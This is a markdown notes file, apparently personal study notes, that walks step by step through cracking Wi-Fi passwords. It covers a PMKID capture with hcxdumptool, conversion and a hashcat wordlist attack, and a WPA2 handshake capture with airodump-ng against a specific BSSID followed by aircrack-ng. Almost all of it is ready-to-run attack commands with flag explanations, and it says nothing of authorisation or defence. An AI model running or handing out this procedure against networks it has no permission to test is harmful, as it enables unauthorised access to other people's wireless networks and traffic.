# Wi-Fi Hacking Notes

## Scan the Network for Access Points
Use the built-in **NetworkManager CLI** to detect local access points:

```bash
nmcli -p dev wifi list
```

- `-p` → organizes the output  
- `dev` → specifies what device to select  
- `wifi` → specifies the wireless interface  
- `list` → lists the available access points  

Once the desired access point has been selected, log the network information for future use.

---

## Kill Interfering Processes
Check to see if any processes are interfering with monitor mode:

```bash
sudo airmon-ng check kill
```

---

## Capturing the PMKID
Download and use **hcxdumptool** to extract the PMKID from the AP.  
Fill in the AP’s MAC address in the filter list flag:

```bash
sudo hcxdumptool -i wlan0 -o outcapture   --enable_status=1   --filterlist_ap=**:**:**:**:**:**   --filtermode=2 -c *
```

- `-i` → specifies the interface to use  
- `-o` → points to the output capture file  
- `--enable_status=1` → captures EAPOL frames to capture the PMKID  
- `--filterlist_ap` → the BSSID (MAC) of the AP  
- `--filtermode=2` → only scans the specified BSSID  
- `-c` → router’s channel  

---

## Converting the PMKID Capture File to a Hash
Use **hcxpcapngtool** to convert the capture file to a hash:

```bash
hcxpcapngtool -o hash.txt outcapture
```

- `-o` → points to the output hash file  

---

## Cracking the Hash
Use **hashcat** to crack the hash and obtain the password:

```bash
sudo hashcat -m 22000 hash.txt -a 0 -o password.txt /usr/share/wordlists/rockyou.txt
```

- `-m` → references the hash type (22000 is PMKID EAPOL)  
- `-a` → references attack mode  
- `-o` → points to the output text file  

---

## Viewing the Password
```bash
sudo cat password.txt
```

---

# WPA2 Attack Notes

### Scan for Networks
```bash
airodump-ng wlan0mon
```
Initiates a wireless network scan to find available networks.

---

### Targeted Capture
```bash
airodump-ng wlan0mon -w name.cap --bssid 28:80:88:3C:23:C2 -c 10
```

- `-w name.cap` → output file  
- `--bssid 28:80:88:3C:23:C2` → target specific AP  
- `-c 10` → focus on channel 10  

---

### Verify 4-Way Handshake
Open the `.cap` file in Wireshark and look for **EAPOL frames** to verify a handshake.

---

### Crack the Handshake
```bash
aircrack-ng name.cap
```
Attempts to brute-force or dictionary attack the captured handshake to discover the PSK.
